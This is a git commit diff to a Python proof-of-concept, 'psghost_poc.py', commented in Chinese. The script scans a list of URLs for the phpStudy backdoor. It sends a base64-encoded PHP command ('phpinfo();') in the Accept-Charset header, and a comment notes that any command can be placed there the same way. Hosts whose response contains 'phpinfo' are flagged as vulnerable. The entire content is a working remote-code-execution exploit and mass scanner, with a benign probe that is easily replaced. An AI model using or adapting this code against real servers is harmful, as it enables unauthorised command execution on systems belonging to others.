b744e33980708c4fa2b025201cef57a70e32dca4
ph4ntom <ph4ntom11235@gmail.com>
2019-09-27 14:36:00 +0800

    Update psghost_poc.py

--- psghost_poc.py
+++ psghost_poc.py
@@ -20,21 +20,20 @@ def check(url):
         'Sec-Fetch-User': '?1',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
         'Sec-Fetch-Site': 'none',
-        'accept-charset': 'cGhwaW5mbyUyOCUyOSUzQg==',
+        'accept-charset': 'cGhwaW5mbygpOw==',     #将命令base64编码后放入accept-charset头
         'Accept-Encoding': 'gzip,deflate',
         'Accept-Language': 'zh-CN,zh;q=0.9',
     }
     try:
         res = rq.get(url, headers=headers, timeout=20)
         if res.status_code == 200:
-            if res.text.find('PHP Version'):
+            if res.text.find('phpinfo') != -1:
                 print("[存在漏洞] " + url)
     except:
         print("[超时] " + url)
 
 
 if __name__ == '__main__':
-    input("任意按键开始执行..")
     tasks = [gevent.spawn(check, url) for url in file_read()]
     print("正在执行...请等候")
     gevent.joinall(tasks)
